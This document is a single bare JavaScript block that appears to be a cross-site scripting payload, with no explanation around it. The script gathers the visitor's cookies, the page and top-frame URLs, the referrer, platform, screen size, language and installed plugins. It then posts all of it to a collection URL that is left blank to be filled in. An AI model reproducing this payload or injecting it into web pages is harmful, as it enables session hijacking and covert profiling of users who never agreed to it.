<script>
info = {};
info.referrer = document.referrer;
info.location = window.location.href;
info.toplocation = top.location.href;
try {
    info.cookie = document.cookie;
} catch(error) {
    info.cookie = "-";
};
info.domain = document.domain;
info.title = document.title;
info.charset = document.characterSet ? document.characterSet : document.charset;
info.platform = navigator.platform;
info.screen = function () {
    var c = "";
    if (self.screen) {
        c = screen.width + "x" + screen.height;
    }
    return c;
}();
info.plugins = '';
if (window.ActiveXObject) {
    info.lang = navigator.systemLanguage;
    var __c = null;
    try {
        __c = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
    } catch (e) {}
    if (__c) {
        info.plugins = 'Shockwave Flash ' + __c.GetVariable('$version');
    }
} else {
    info.lang = navigator.language;
    if (navigator.plugins && navigator.plugins.length > 0) {
        for (var i = 0; i < navigator.plugins.length; i++) {
            info.plugins += navigator.plugins[i].name + ',' + navigator.plugins[i].description + '|';
        }
    }
}
result = '';
for(var s in info){
	result += ' '+s+':'+info[s]
}

function getHttpObj() {  
	var httpobj = null;  
	try {  
		httpobj = new ActiveXObject("Msxml2.XMLHTTP");  
	}  
	catch (e) {  
		try {  
			httpobj = new ActiveXObject("Microsoft.XMLHTTP");  
		}  
		catch (e1) {  
			httpobj = new XMLHttpRequest();  
		}  
	}  
	return httpobj;  
}  

url = '';
var xhr = getHttpObj();  
xhr.open("post", url, true);  
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;");  
xhr.send("result="+result);
</script>